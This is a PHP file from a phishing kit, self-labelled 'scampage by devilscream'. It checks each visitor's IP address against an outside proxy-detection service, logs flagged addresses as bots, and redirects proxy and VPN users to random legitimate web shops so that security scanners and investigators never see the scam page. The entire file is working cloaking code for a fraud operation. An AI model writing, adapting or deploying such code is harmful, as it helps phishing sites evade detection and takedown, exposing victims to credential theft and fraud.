<?php
//scampage by devilscream

$random_id = sha1(rand(0,1000000));
$link = array("https://href.li/?https://www.danicathreesixty.com",
"https://href.li/?https://www.thegldshop.com",
"https://href.li/?https://704-shop.myshopify.com",
"https://href.li/?https://corgi-overload-store.myshopify.com",
"https://href.li/?https://www.cubowl.com",
"https://href.li/?https://woolman.io",
"https://href.li/?https://store.lilbub.com",
"https://href.li/?https://www.davdev9.com",
"https://href.li/?https://shop-demure.com",
"https://href.li/?https://www.elevenmadisonpark.store",
"https://href.li/?https://faktr-store.com",
"https://href.li/?https://www.wanderlust.store");
$random = rand(0, 11);
$link = $link[$random];

function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip = getUserIPs();
if($proxyblock == 1) {
    if($ip == "127.0.0.1") {
    }else{
        $url = "http://proxy.mind-media.com/block/proxycheck.php?ip=".$ip;
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        $result = $resp;
        if($result == "Y") {
            $file = fopen("proxy-block.txt","a");
            $message = $ip."\n";
            fwrite($file, $message);
            fclose($file);
            $click = fopen("total_bot.txt","a");
            fwrite($click,"$ip (Detect by Proxy/VPN)"."\n");
            fclose($click);
            header("location: $link");
            exit();
        }
    }
}
?>